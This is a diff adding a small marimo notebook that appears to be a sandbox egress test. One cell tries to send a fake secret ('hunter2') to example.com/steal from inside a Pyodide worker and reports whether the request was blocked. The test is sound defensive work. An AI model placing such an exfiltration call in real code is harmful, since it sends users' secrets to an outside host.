@@ -1,0 +1,35 @@
+# /// script
+# requires-python = ">=3.12"
+# dependencies = [
+#     "marimo",
+# ]
+# ///
+
+import marimo
+
+__generated_with = "0.23.10"
+app = marimo.App(width="medium")
+
+
+@app.cell
+def _():
+    import marimo as mo
+    return (mo,)
+
+
+@app.cell
+async def _(mo):
+    # A hostile notebook trying to exfiltrate from inside the Pyodide worker.
+    result = "pending"
+    try:
+        from js import fetch
+        await fetch("https://example.com/steal?secret=hunter2")
+        result = "LEAKED — the worker reached the external network"
+    except Exception as e:
+        result = f"blocked in worker ({type(e).__name__})"
+    mo.md(f"## Worker egress test: {result}")
+    return
+
+
+if __name__ == "__main__":
+    app.run()
